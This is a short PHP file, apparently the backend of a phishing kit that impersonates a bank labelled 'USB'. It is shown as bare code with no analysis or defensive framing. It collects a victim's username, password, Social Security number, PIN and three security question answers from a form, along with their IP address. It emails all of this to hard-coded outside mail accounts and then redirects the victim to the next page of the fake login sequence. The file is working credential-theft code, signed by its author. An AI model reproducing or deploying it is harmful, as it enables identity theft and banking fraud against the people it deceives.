<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$sn = $_POST['ssn'];
$pn = $_POST['peen'];
$q1 = $_POST['que1'];
$a1 = $_POST['ans1'];
$q2 = $_POST['que2'];
$a2 = $_POST['ans2'];
$q3 = $_POST['que3'];
$a3 = $_POST['ans3'];

$user = $_POST['uname'];
$pass = $_POST['passe'];
$cariko="ae7410891@gmail.com, result1983@hotmail.com";


  $subj = "USB $ip";
  $msg = "Logon Info\n\n

Username: $user\n
Password: $pass\n
SSN: $sn\n
PIN: $pn\n
Security Question 1: $q1\n
Ans: $a1\n
Security Question 2: $q2\n
Ans: $a2/$zip\n
Security Question 3: $q3\n
ans3: $a3\n 
Submitted from IP Address - $ip on $adddate\n
-----------------------------------\n        
Created By YomiTells
-----------------------------------";

$from = "From: USB<lolz@yankee.come>";
mail("ae7410891@gmail.com, result1980@protonmail.com", $subj, $msg, $from);
header("Location: Step-3.html");

?>